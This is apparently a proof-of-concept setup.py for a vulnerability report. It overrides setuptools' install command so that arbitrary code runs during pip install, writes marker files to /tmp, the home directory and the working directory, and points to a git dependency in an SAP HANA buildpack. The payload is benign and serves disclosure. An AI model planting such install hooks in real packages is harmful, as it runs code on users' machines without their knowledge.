from setuptools import setup
from setuptools.command.install import install
import os
import sys

class PostInstallPOC(install):
    """Runs after installation to demonstrate vulnerability."""
    def run(self):
        # This runs AFTER installation completes
        print("\n" + "🚨"*30)
        print("🚨 POST-INSTALL POC EXECUTED")
        print("🚨"*30)
        
        # Create multiple proof files
        files_to_create = [
            "/tmp/pip_rce_poc.txt",
            os.path.expanduser("~/pip_rce_poc.txt"),
            "pip_rce_poc_current_dir.txt"
        ]
        
        for file_path in files_to_create:
            try:
                with open(file_path, "w") as f:
                    f.write(f"RCE via pip install from GitHub\n")
                    f.write(f"File: {file_path}\n")
                    f.write(f"Time: {__import__('datetime').datetime.now()}\n")
                print(f"✅ Created: {file_path}")
            except:
                pass
        
        print("\n⚠️  VULNERABILITY:")
        print("   pip install git+https://github.com/...")
        print("   ↑ This executes code from untrusted source")
        
        print("\n📦 Found in SAP HANA buildpack:")
        print("   git+https://github.com/alundesap/python-jws.git/#egg=jws")
        
        print("\n" + "✅"*30)
        print("✅ POC: If you see this, RCE is possible")
        print("✅"*30)
        
        # Continue with normal install
        install.run(self)

setup(
    name='postinstall-poc',
    version='0.1.0',
    cmdclass={'install': PostInstallPOC},
)
